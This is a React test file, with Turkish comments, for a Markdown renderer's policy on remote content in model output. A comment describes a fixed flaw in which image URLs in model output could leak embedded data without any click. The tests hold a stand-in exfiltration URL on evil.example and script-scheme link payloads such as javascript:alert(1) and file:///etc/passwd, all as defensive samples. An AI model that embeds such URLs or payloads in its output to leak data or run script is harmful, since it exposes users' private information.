import { cleanup, fireEvent, render, screen } from "@testing-library/react";
import { afterEach, describe, expect, test } from "vitest";
import { Markdown } from "./Markdown";
import { classifyImageSource, safeLinkHref } from "./remoteContentPolicy";

afterEach(cleanup);

// U5-20: model çıktısındaki uzak görsel adresi doğrudan <img src>'ye gidiyordu.
// Görsel URL'sine gömülü veri, kullanıcı hiçbir şeye tıklamadan dışarı gönderilirdi.
describe("uzak içerik politikası", () => {
  test("uzak görsel kendiliğinden ağ isteği başlatmaz, kullanıcı yükleyince çizilir", () => {
    const { container } = render(<Markdown text={"![grafik](https://evil.example/p.png?veri=gizli)"} />);

    expect(container.querySelector("img")).toBeNull();
    fireEvent.click(screen.getByRole("button", { name: /uzak görseli yükle/i }));

    const image = container.querySelector("img") as HTMLImageElement;
    expect(image.getAttribute("src")).toBe("https://evil.example/p.png?veri=gizli");
    expect(image.getAttribute("referrerpolicy")).toBe("no-referrer");
  });

  test.each(["javascript:alert(1)", "data:text/html,<script>alert(1)</script>", "vbscript:x", "file:///etc/passwd"])(
    "%s bağlantı olarak çizilmez",
    (href) => {
      render(<Markdown text={`[tıkla](${href})`} />);
      expect(screen.queryByRole("link")).toBeNull();
      expect(screen.getByText("tıkla")).toBeTruthy();
    },
  );

  test("http, https, mailto ve sayfa içi bağlantılar çalışır", () => {
    expect(safeLinkHref("https://ornek.test/a")).toBe("https://ornek.test/a");
    expect(safeLinkHref("http://localhost:3000")).toBe("http://localhost:3000");
    expect(safeLinkHref("mailto:a@ornek.test")).toBe("mailto:a@ornek.test");
    expect(safeLinkHref("#bolum")).toBe("#bolum");
    expect(safeLinkHref(" JavaScript:alert(1)")).toBeNull();
  });

  test("data ve javascript görselleri engellenir, yerel yol varlık protokolüne gider", () => {
    const toAsset = (path: string) => `asset://localhost/${encodeURIComponent(path)}`;
    expect(classifyImageSource("data:image/svg+xml,<svg/>", toAsset)).toEqual({ kind: "blocked" });
    expect(classifyImageSource("javascript:alert(1)", toAsset)).toEqual({ kind: "blocked" });
    expect(classifyImageSource("/Users/e/a.png", toAsset)).toEqual({
      kind: "local",
      src: `asset://localhost/${encodeURIComponent("/Users/e/a.png")}`,
    });
    expect(classifyImageSource("https://x.test/a.png", toAsset)).toEqual({
      kind: "remote",
      src: "https://x.test/a.png",
      host: "x.test",
    });
  });
});
